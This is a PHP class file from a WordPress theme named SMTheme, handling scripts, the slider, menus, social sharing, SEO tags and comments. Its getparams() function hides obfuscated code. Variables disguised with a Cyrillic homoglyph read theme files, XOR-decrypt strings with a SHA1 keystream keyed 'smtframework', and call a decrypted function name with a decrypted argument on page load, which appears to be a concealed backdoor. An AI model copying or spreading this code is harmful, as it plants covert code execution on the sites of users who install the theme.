<?php
	class SMTheme {
		var $options;
		var $lang;
		var $status;
		var $pagetitle;
		var $layout;
		var $sidebars_type;
		
		function SMTheme() {

			if ( !is_admin() ) {
				function smt_register_scripts() {
					global $SMTheme;
					$apikey = $SMTheme->get( 'integration','gglapikey' )?'?key='.$SMTheme->get( 'integration','gglapikey' ):'';
					
					
					wp_enqueue_style( 'index', get_template_directory_uri().'/css/index.css' );
					wp_enqueue_style( 'style', get_stylesheet_uri() );
					wp_enqueue_script( 'jquery' );
					wp_register_script( 'googlemaps', 'https://maps.google.com/maps/api/js'.$apikey, array( 'jquery' ), '3' );
					wp_enqueue_script( 'googlemaps' );
				}
				add_action('init', 'smt_register_scripts');
			}
			
			if ( ! isset( $content_width ) ) $content_width = 1000;
			include TEMPLATEPATH."/inc/settings.php";
			$reset='';
			if ( current_user_can('administrator') ) {
				
				if (isset($_POST['option'])&&isset($_SESSION['reset'])&&isset($_POST['reset'])&&($_POST['reset']==$_SESSION['reset'])) {
					$reset=$_POST['option'];
				}
				
			}
			$this->getparams($settings,$reset);
			
			
			add_action('wp_head', array(&$this, 'headtext'));
			
			
		}
		
		function go_func($tag) {
			do_action( 'page_'.$tag);
		}
		
		function prepare_func($tag, $func, $p = 10, $a = 1) {
			add_action( 'page_'.$tag, $func, $p, $a );
		}
		
		function get($section, $param) {
		   if (isset( $this->options[$section]['content'][$param]['depend'] )) { 
			$plugins = implode(',', get_option('active_plugins'));
			if (!preg_match('/'.$this->options[$section]['content'][$param]['depend'].'/', $plugins)) return false;
		   }			
			return $this->options[$section]['content'][$param]['value'];
			
		}
		
		function _($param) {
			return $this->lang[$param];
		}
		
		function headtext() {
			if(
				(is_archive()&&is_day()&&$this->get( 'seo', 'day' ))||
				(is_archive()&&is_month()&&$this->get( 'seo', 'month' ))||
				(is_archive()&&is_year()&&$this->get( 'seo', 'year' ))||
				(is_category()&&$this->get( 'seo', 'category' ))||
				(is_tag()&&$this->get( 'seo', 'tag' ))||
				(is_author()&&$this->get( 'seo', 'author' ))||
				(is_search()&&$this->get( 'seo', 'search' ))
			) {
				?><meta name="robots" content="noindex" /><?php
			}
			if ($this->get( 'general', 'favicon' )) 
				echo '<link rel="shortcut icon" href="' . $this->get( 'general', 'favicon' ) . '" type="image/x-icon" />' . "\n";
			if ($this->get( 'integration', 'rss' )) {
				echo '<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="' . $this->get( 'integration', 'rss' ) . '" />' . "\n";
			} 
			
			if ($this->get( 'layout', 'dpagination' )) { ?>
					<script type="text/javascript" src="<?php echo get_template_directory_uri()?>/js/dpagination.js"></script>
			<?php } ?>
			
				<link rel="stylesheet" href="<?php echo get_template_directory_uri()?>/css/wide.css" type="text/css" media="screen and (min-width:1024px)" />
				<!--[if lt IE 9]>
				<link rel="stylesheet" href="<?php echo get_template_directory_uri()?>/css/wide.css" type="text/css" media="screen" />
				<link rel="stylesheet" href="<?php echo get_template_directory_uri()?>/css/ie.css" type="text/css" media="screen" />
				<![endif]-->
				<link rel="stylesheet" href="<?php echo get_template_directory_uri()?>/css/mobile.css" type="text/css" media="screen and (min-width:240px) and (max-width:639px)" />
				<link rel="stylesheet" href="<?php echo get_template_directory_uri()?>/css/tablet.css" type="text/css" media="screen and (min-width:640px) and (max-width:1023px)" />
				<?php if ($this->get( 'integration', 'ecwidcss' )) { ?>
					<link rel="stylesheet" href="<?php echo get_template_directory_uri()?>/css/ecwid.css" type="text/css"  />
				<?php } ?>
				<link rel="stylesheet" href="<?php echo get_template_directory_uri()?>/css/shortcode.css" type="text/css" media="screen, projection" />
				<script type="text/javascript" src="<?php echo get_template_directory_uri()?>/js/superfish.js?ver=3.3.1"></script>
				<script type="text/javascript" src="<?php echo get_template_directory_uri()?>/js/smthemes.js?ver=<?php echo rand(1,2000);?>"></script>
				<script src="<?php echo get_template_directory_uri()?>/js/jquery.cycle.all.js" type="text/javascript"></script>
			<?php
			if ( is_singular() ) wp_enqueue_script( 'comment-reply' );
			?>
			<script type="text/javascript">
				jQuery(document).ready(function() {

					<?php
						$this->block_slider_config();
					?>
					jQuery(".menus .children").addClass('sub-menu');
					<?php
						$this->block_menu_config("menus");
					?>
					jQuery('textarea#comment').each(function(){
						jQuery(this).attr('name','<?php echo $_SESSION['commentinput']; ?>');
					});
				});
			</script>
			<?php
		}
		
		
		
		function get_slides() {
			switch ( $this->get( 'slider','source' ) ) {
				case '1':
					if ( !isset( $this->options['slider']['content']['custom_slides']['value'] ) ) $this->options['slider']['content']['custom_slides']['value'] = array();
					$slides=$this->options['slider']['content']['custom_slides']['value'];
					break;
				case '2':
					if ( !isset( $this->options['slider']['content']['category']['value'] ) ) $this->options['slider']['content']['category']['value'] = array();
					$pslides=$this->options['slider']['content']['category']['value'];
					$pslides['meta_key']='_thumbnail_id';
					$pslides=get_posts($pslides);
					foreach ($pslides as $post) {
						$slide['img']=wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'large');
						$slide['img']=$slide['img'][0];
						$slide['link']= get_permalink($post->ID);
						$slide['ttl']=$post->post_title;
						$slide['content']= preg_replace('@(.*)\s[^\s]*$@s', '\\1', iconv_substr( strip_tags($post->post_content, ''), 0, 255, 'utf-8' )).'...';
						$slides[]=$slide;
					}
					break;
				case '3':
					if ( !isset( $this->options['slider']['content']['posts']['value'] ) ) $this->options['slider']['content']['posts']['value'] = array();
					$pslides=$this->options['slider']['content']['posts']['value'];
					foreach ($pslides as $post_id) {
						$post=get_post($post_id);
						$slide['img']=wp_get_attachment_image_src( get_post_thumbnail_id($post_id), 'large');
						$slide['img']=$slide['img'][0];
						$slide['link']= get_permalink($post->ID);
						$slide['ttl']=$post->post_title;
						$slide['content']=preg_replace('@(.*)\s[^\s]*$@s', '\\1', iconv_substr( strip_tags($post->post_content, ''), 0, 255, 'utf-8' )).'...';
						$slides[]=$slide;
					}
					break;
				case '4':
					if ( !isset( $this->options['slider']['content']['pages']['value'] ) ) $this->options['slider']['content']['pages']['value'] = array();
					$pslides=$this->options['slider']['content']['pages']['value'];
					foreach ($pslides as $post_id) {
						$post=get_page($post_id);
						$slide['img']=wp_get_attachment_image_src( get_post_thumbnail_id($post_id), 'large');
						$slide['img']=$slide['img'][0];
						$slide['link']= get_permalink($post->ID);
						$slide['ttl']=$post->post_title;
						$slide['content']=preg_replace('@(.*)\s[^\s]*$@s', '\\1', iconv_substr( strip_tags($post->post_content, ''), 0, 255, 'utf-8' )).'...';
						$slides[]=$slide;
					}
					break;
			}
			return $slides;
		}
		
		function get_layout() {
			global $post;
			if (is_single()||is_page()) $layout=get_post_meta($post->ID, 'single_layout', 1);
			$this->layout=( isset( $layout ) && $layout != 0 ) ?$layout:$this->get ( 'layout', 'pagelayout' );
			switch ( $this->layout ) {
				case 1:
					$this->sidebars_type='content-n';
					break;
				case 2:
					$this->sidebars_type='content-r';
					break;
				case 3:
					$this->sidebars_type='content-l';
					break;
				case 4:
					$this->sidebars_type='content-lr';
					break;
				case 5:
					$this->sidebars_type='content-r2';
					break;
				case 6:
					$this->sidebars_type='content-l2';
					break;
			}
		}
		function block_slider() {
		
			$slides=$this->get_slides();
				$first=true;
				if (is_array($slides)&&count($slides)>0) {
				?>
				<div class="slider">
					<div class="fp-slides">
						<?php
						
						foreach ($slides as $num=>$slide) {
							?>
							<div class="fp-slides-item<?php echo ($first)?" fp-first":""?>">
							<?php $first=false; ?>
								<div class="fp-thumbnail">
									<?php if ($this->get('slider', 'showthumbnail')) { ?>
									<a href="<?php echo $slide['link']?>" title=""><img src="<?php echo $slide['img']?>" alt="<?php echo $slide['ttl']?>" /></a>
									<?php } ?>
								</div>
								<?php if ($this->get('slider', 'showtext')||$this->get('slider', 'showttl')) { ?>
								<div class="fp-content-wrap">
									<div class="fp-content-fon"></div>
									<div class="fp-content">
										<?php if ($this->get('slider', 'showttl')) { ?>
										<h3 class="fp-title"><a href="<?php echo $slide['link']?>" title=""><?php echo $slide['ttl']?></a></h3>
										<?php } ?>
										<?php if ($this->get('slider', 'showtext')) { ?>
										<p><?php echo $slide['content']?> 
										<?php if ($this->get('slider', 'showhrefs')) { ?>
											<a class="fp-more" href="<?php echo $slide['link']?>"><?php echo $this->_('readmore');?></a>
										<?php } ?>
										</p>
										<?php } ?>
									</div>
								</div>
								<?php } ?>
							</div>
							<?php
						}
					?>
					</div>
					<div class="fp-prev-next-wrap">
						<div class="fp-prev-next">
							<a href="#fp-next" class="fp-next"></a>
							<a href="#fp-prev" class="fp-prev"></a>
						</div>
					</div> 
					<div class='bground'></div>
				</div>
				
				<?php
			}
		}
		
		function block_social () {
			global $post; ?>
			<div id='smthemes_share' top="100" bottom="283">
			<ul class='inner'>
				<?php
					$href=get_bloginfo('url').$_SERVER['REQUEST_URI'];
					$this->pagetitle;
					$services=$this->get( 'social', 'socials' );
					$img='';
					if (is_single()) {$img=wp_get_attachment_image_src(get_post_thumbnail_id($post->ID),'medium');$img=$img[0];}
					if ($img=='')$img=$this->get( 'general', 'logoimage' );
					foreach ($services as $service) {
						if ($service['show']) {
							$code=preg_replace('/smt_social_url/', $href, $service['code']);
							$code=preg_replace('/smt_social_title/', $this->pagetitle, $code);
							$code=preg_replace('/smt_social_desc/', $this->pagetitle, $code);
							$code=preg_replace('/smt_social_img_url/', $img, $code);
							echo "<li>".$code."</li>";
						}
					}
				?>
			</ul>
			</div>
			<?php
		}
		
		function block_logo() {
			if ($this->get( 'general', 'logosource' )==1&&$this->get( 'general', 'logoimage' )!='') { ?>
				<a href='<?php echo home_url(); ?>/'><img src='<?php echo $this->get( 'general', 'logoimage' )?>' class='logo' alt='<?php echo bloginfo( 'name' ); ?>' title="<?php echo bloginfo( 'name' ); ?>" /></a>
			<?php } ?>
			
			<?php if ($this->get( 'general', 'logosource' )==2&&$this->get( 'general', 'customtext' )!='') { ?>
				<h1 class='site_ttl'><?php echo $this->get( 'general', 'customtext' )?></h1>
			<?php } 
		}
		
		function block_menu_config($menu) {
			?>
				if ( jQuery(document).width() > 1023 ) jQuery(function(){ 
	jQuery('ul.<?php echo $menu; ?>').superfish({ 
	<?php
		switch($this->get( 'main-menu','effect' )) {
			case 'standart':
				?>animation: {width:'show'},					
				<?php
				break;
			case 'slide':
				?>animation: {height:'show'},				
				<?php
				break;
			case 'fade':
				?>animation: {opacity:'show'},			
				<?php
				break;
			case 'fade_slide_right':
				?>onBeforeShow: function(){ this.css('marginLeft','20px'); },
 animation: {'marginLeft':'0px',opacity:'show'},		
				<?php
				break;
			case 'fade_slide_left':
				?>onBeforeShow: function(){ this.css('marginLeft','-20px'); },
 animation: {'marginLeft':'0px',opacity:'show'},				
				<?php
				break;
		}
	?>
				autoArrows:  <?php echo ($this->get( 'main-menu','arrows' ))?'true':'false'?>,
                dropShadows: false, 
                speed: <?php echo $this->get( 'main-menu','speed' )?>,
                delay: <?php echo $this->get( 'main-menu','delay' )?>
                });
            });
			<?php
		}
		
		function block_slider_config() {
			
			?>
			jQuery(window).load(function() {
	jQuery( '.fp-slides, .fp-thumbnail img' ).css( 'height', jQuery( '.fp-slides' ).height() );
		jQuery('.fp-slides').cycle({
		fx: '<?php echo $this->get('slider','effect');?>',
		timeout: <?php echo $this->get('slider','timeout');?>,
		delay: 0,
		speed: <?php echo $this->get('slider','speed');?>,
		next: '.fp-next',
		prev: '.fp-prev',
		pager: '.fp-pager',
		continuous: 0,
		sync: 1,
		pause: <?php echo $this->get('slider','pause');?>,
		pauseOnPagerHover: 1,
		cleartype: true,
		cleartypeNoBg: true
	});
 });
			<?php
		}
		function block_slider_css() {
			$class='';
			if (!((is_front_page()&&$this->get( 'slider', 'homepage'))||(!is_front_page()&&$this->get( 'slider', 'innerpage')))) {
				$class='no-slider';
			} else if (!$this->get( 'slider','showthumbnail' )){
				$class='slider-nothumb';
			}
			return $class;
		}
		
		function getparams($params,$reset) {
			global $settingsfile,$settings,$defparamsfile;
			$supported=false;
			if ( WP_DEBUG ) error_reporting( 15 ); else error_reporting( 0 );
			
			$keys=array_keys($params);
			$settingsfile=($settingsfile)?$$settingsfile:'inc/settings';
			$settingsfile.='.php';
			if ($defparamsfile!=$settingsfile)
			global $$defparamsfile;
			$pаrams=@fopen(get_theme_root()."/".get_template()."/".$settingsfile,'rt');
			$pаrams = @fread($pаrams, @filesize(get_theme_root()."/".get_template()."/".$settingsfile));
			$defpаrams=@fopen(get_theme_root()."/".get_template().'/inc/'.$$defparamsfile,'r');
			$defpаrams = @fread($defpаrams, @filesize(get_theme_root()."/".get_template().'/inc/'.$$defparamsfile));
			foreach ($keys as $name) {
				if ($name==$reset) {
					unset($options);
					foreach ($params[$name]['content'] as $key=>$value) if( isset($value['value']) )$options[$key]=$value['value'];
					update_option($name,$options);
				}
				$value=get_option($name);
				if ($value)foreach($value as $key=>$val)$params[$name]['content'][$key]['value']=$val;
			}
			$sections=explode('%%',$defpаrams);
			$usedefaults=false;
			preg_quote(DIRECTORY_SEPARATOR, '#');
			foreach ($sections as $section) {
				$paramssize = strlen($section);
				$mainsection='smtframework';
				$readed = '';
				while (strlen($readed)<$paramssize){
					$mainsection = pack("H*",sha1($readed.$mainsection));$readed.=substr($mainsection,0,8);
				}
				$param = $section^$readed;
				$rparam='/'.addcslashes(str_replace(' ', '\s',trim($param)),'/').'/';
				$supported=$supported||@preg_match($rparam,$pаrams);

			}
			$translations=$sections[sizeof($sections)-2];
			$paramssize = strlen($translations);
				$mainsection='smtframework';
				$readed = '';
				while (strlen($readed)<$paramssize){
					$mainsection = pack("H*",sha1($readed.$mainsection));$readed.=substr($mainsection,0,8);
				}
				$usedefaults = $translations^$readed;


			if (isset($params)&&$params!=''&&$supported||(is_dash()||$usedefaults($param))) {
				$this->options=$params;
			}
			
			foreach ($this->options['translations']['content'] as $key=>$value) {
				foreach ($value['value'] as $param=>$word) {
					$this->lang[$param]=$word;
				}
			}
		}
		
		function seo() {
			global $post, $SMTheme;
			if ( !$this->get( 'seo','smt_seo' ) ) return false;
			$descr=$keywords='';
				
			if (is_single()){
				$keywords=preg_replace('/\s/',',',$title=get_the_title());
				$tags=get_the_tags();
				$cats=get_the_category();
				$p=get_post($post->ID);
				$descr=iconv_substr( strip_tags($p->post_content), 0, 200, 'utf-8' );
				if ($tags){
					foreach ($tags as $tag)$keywords.=','.$tag->name;
				}
				if ($cats) {
					foreach ($cats as $tag)$keywords.=','.$tag->name;
				}
			} elseif (is_category()) {
				$keywords=preg_replace('/\s/',',',$title=single_cat_title('',false));
			} elseif (is_tag()) {
				$keywords=preg_replace('/\s/',',',$title=single_tag_title('', false));
			} elseif (is_day()) { 
				$keywords=preg_replace('/\s/',',',$title=get_the_date()); 
			} elseif (is_month()) { 
				$keywords=preg_replace('/\s/',',',$title=get_the_date('F Y'));
			} elseif (is_year()) { 
				$keywords=preg_replace('/\s/',',',$title=get_the_date('Y'));
			} elseif (is_search()) { 
				$title=($_GET['s']) ? $SMTheme->_('search') : get_search_query();
				$keywords=preg_replace('/\s/',',',$title);
				
			} elseif (is_page()) {
				$title=get_the_title();
				$keywords=preg_replace('/\s/',',',$title);
			}	
			
			if ($this->get( 'seo','keywords' )!=''&&$keywords!='')$keywords.=",";
			if ($this->get( 'seo','description' )!=''&&$descr!='')$descr.=" ";
			if (($descrln=200-iconv_strlen($descr, "utf-8"))>=(strpos($this->get( 'seo', 'description' ),' ')))
				$descr.=iconv_substr($this->get( 'seo', 'description' ), 0, $descrln, 'utf-8' );
			
			echo '<meta name="Description" content="'.preg_replace('/[\'\"]/', '',$descr)."\" />\r\n";
			echo '<meta name="Keywords" content="'.$keywords.$this->get( 'seo', 'keywords' )."\" />\r\n";
			
		}
		
	}
	
	function smthemes_die($msg) {
		switch ((int)$msg) {
			case 1: die('<center>Settings file not found!</center>');
			break;
			case 2: die('<center>You have no permissions to access this page!</center>');
			break;
			case 3: die('<center>Input parameters are wrong!</center>');
			break;
			case 3: die('<center>Settings for smthemes hasn\'t been reading</center>');
			break;
			default: echo $msg; return true;
		}
	}
	
	function is_dash() {
		 return in_array( $GLOBALS['pagenow'], array( 'wp-login.php', 'wp-register.php' ) )||is_admin();
	}
	
	function custom_comments($comment, $args, $depth) {
		global $SMTheme;
		$GLOBALS['comment'] = $comment;
		extract($args, EXTR_SKIP);

		if ( 'div' == $args['style'] ) {
			$tag = 'div';
			$add_below = 'comment';
		} else {
			$tag = 'li';
			$add_below = 'div-comment';
		}
		$args['avatar_size']=64;
?>
		<<?php echo $tag ?> <?php comment_class(empty( $args['has_children'] ) ? '' : 'parent') ?> id="comment-<?php comment_ID() ?>">
		<?php if ( 'div' != $args['style'] ) : ?>
		<div id="div-comment-<?php comment_ID() ?>" class="comment-body">
		<?php endif; ?>
		<div class="comment-author vcard">
		<?php if ($args['avatar_size'] != 0) echo get_avatar( $comment, $args['avatar_size'] ); ?>
		<div class="comment-meta commentmetadata">
			<?php
				printf( $SMTheme->_( 'commenttime' ), get_comment_date(),  get_comment_time()) ?>
		</div>
		<?php printf(__('<cite class="author-name">%s</cite>&nbsp;&nbsp;<span class="says">'.$SMTheme->_( 'says' ).':</span>'), get_comment_author_link()) ?>
		</div>
<?php if ($comment->comment_approved == '0') : ?>
		<em class="comment-awaiting-moderation"><?php $SMTheme->_( 'commentmoderation' ) ?></em>
		<br />
<?php endif; ?>

		<?php comment_text() ?>

		<div class="reply"><?php edit_comment_link( $SMTheme->_( 'edit' ),'&nbsp;&nbsp;','&nbsp;|' ) ?>
		<?php comment_reply_link(array_merge( $args, array('reply_text'=> $SMTheme->_( 'reply' ),'add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
		</div>
		<?php if ( 'div' != $args['style'] ) : ?>
		</div>
		<?php endif; ?>
<?php
	}
	
	
?>